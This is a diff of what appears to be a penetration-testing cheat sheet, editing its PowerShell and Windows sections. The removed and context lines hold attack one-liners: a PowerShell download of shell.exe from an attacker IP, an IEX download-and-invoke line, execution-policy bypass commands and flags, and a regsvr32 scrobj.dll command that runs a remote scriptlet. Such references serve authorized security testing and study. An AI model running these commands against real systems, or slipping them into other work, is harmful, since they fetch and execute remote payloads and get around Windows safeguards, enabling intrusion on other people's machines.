@@ -481,24 +481,6 @@ Extract: `./extractor.sh ../../.git ../../git-dest-dir`
 
 Impacket: `python smbserver.py shared /root/Desktop/repo`
 
-### Windows Clients
-
-PSH: `(new-object System.Net.WebClient).DownloadFile('http://10.10.16.33/shell.exe','C:\windows\temp\shell.exe')`
-
-## Powershell:
-
-`powershell.exe -File file.ps1`\
-`Powershell.exe -c 'code to execute’`\
-
-Options:
-
--ExecutionPolicy Bypass\
--NoLogo\
--NonInteractive\
--NoProfile\
--NoExit
-
-
 ## Android APK:
 
 Monitor log file: `pidcat $appname`\
@@ -664,6 +646,15 @@ Download and invoke (IWR): `powershell.exe –c “IEX (Invoke-WebRequest -SkipC
 Exection bypass: `powershell.exe -ep bypass -c '{Powershell to execute}'`\
 Exection bypass: `powershell.exe -ep bypass -f file_to_open.ps1`\
 STDin and Get-Content: `Get-Content .\file.ps1 | PowerShell.exe –NoProfile -ExecutionPolicy ByPass –Command -`
+
+PS Options:
+
+-ExecutionPolicy Bypass\
+-NoLogo\
+-NonInteractive\
+-NoProfile\
+-NoExit
+
 
 ## Scrobly doo dobble job job whatever
 RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`
